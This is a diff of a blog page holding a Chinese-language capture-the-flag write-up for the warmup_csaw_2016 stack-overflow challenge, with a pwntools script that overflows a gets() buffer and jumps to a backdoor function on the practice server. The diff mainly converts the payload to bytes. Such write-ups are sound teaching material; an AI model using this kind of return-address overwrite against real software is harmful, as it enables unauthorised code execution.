@@ -57,7 +57,7 @@
 <meta property="og:image" content="https://user-images.githubusercontent.com/93712124/201017736-9633f655-7074-4616-9aaf-ca3b013e07c1.png">
 <meta property="og:image" content="https://user-images.githubusercontent.com/93712124/201017718-3a05091d-247e-4fd2-91c0-14c4a50831b4.png">
 <meta property="article:published_time" content="2022-11-10T06:25:35.000Z">
-<meta property="article:modified_time" content="2022-11-10T06:38:00.408Z">
+<meta property="article:modified_time" content="2022-11-10T13:21:42.397Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://user-images.githubusercontent.com/93712124/201017763-0353906e-e8d7-4588-8215-8c5db19e691e.png">
@@ -194,7 +194,7 @@
     <div class="post__content">
         <h1 id="warmup-csaw-2016-1"><a href="#warmup-csaw-2016-1" class="headerlink" title="warmup_csaw_2016 1"></a>warmup_csaw_2016 1</h1><h3 id="题目描述及其考点"><a href="#题目描述及其考点" class="headerlink" title="题目描述及其考点"></a>题目描述及其考点</h3><p>题目描述：<br>考点：基本的栈溢出</p>
 <h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>使用<strong>checksec</strong>查看程序<br><img src="https://user-images.githubusercontent.com/93712124/201017763-0353906e-e8d7-4588-8215-8c5db19e691e.png" alt="1"><br>使用对应的ida打开程序，F5查看main函数伪代码<br><img src="https://user-images.githubusercontent.com/93712124/201017757-eb8e4bac-c263-4685-8570-620816638726.png" alt="2"><br>发现有溢出漏洞，gets函数，查看传值的变量的大小为0x40字节<br><img src="https://user-images.githubusercontent.com/93712124/201017726-2982b692-ac8a-4e17-a817-ebbc4964fd54.png" alt="3"><br>查看别的函数，发现有留给我们查看flag的后门<br><img src="https://user-images.githubusercontent.com/93712124/201017748-76c9f34f-7859-495c-9735-2ea19a669740.png" alt="4"><br>记住这个函数的地址<strong>0x40060D</strong><br><img src="https://user-images.githubusercontent.com/93712124/201017736-9633f655-7074-4616-9aaf-ca3b013e07c1.png" alt="5"><br>接下来解题思路便有了，便可直接写脚本了   </p>
-<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = remote(&#x27;node4.buuoj.cn&#x27;, 29622)</span><br><span class="line"></span><br><span class="line">payload = &#x27;A&#x27; * 0x40 </span><br><span class="line">payload += &#x27;a&#x27; * 8 </span><br><span class="line">payload += p64(0x40060D + 1).decode()</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = remote(&#x27;node4.buuoj.cn&#x27;, 29622)</span><br><span class="line"></span><br><span class="line">payload = b&#x27;A&#x27; * 0x40 </span><br><span class="line">payload += b&#x27;a&#x27; * 8 </span><br><span class="line">payload += p64(0x40060D + 1)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 <h5 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h5><h6 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h6><p>先将变量填满<br>由于程序是64位文件，需要用8个字节来填充ebp（如果是32位则需要4个字节）<br>再将后门函数的地址溢出到<strong>ret</strong>函数，+1是为了维持堆栈平衡(?)  </p>
 <h4 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h4><p>运行脚本，便拿到了shell，便可拿到flag<br><img src="https://user-images.githubusercontent.com/93712124/201017718-3a05091d-247e-4fd2-91c0-14c4a50831b4.png" alt="6"></p>
 
@@ -207,6 +207,20 @@
 
     <div class="nav">
         <div class="nav__prev">
+            
+                <a href="/2022/11/10/ciscn-2019-n-1-1/" class="nav__link">
+                    <div>
+                        <svg viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" width="24" height="24"><path d="M589.088 790.624L310.464 512l278.624-278.624 45.248 45.248L400.96 512l233.376 233.376z" fill="#808080"></path></svg>
+                    </div>
+                    <div>
+                        <div class="nav__label">
+                            Previous Post
+                        </div>
+                        <div class="nav__title">
+                            ciscn_2019_n_1 1
+                        </div>
+                    </div>
+                </a>
             
         </div>
         <div class="nav__next">
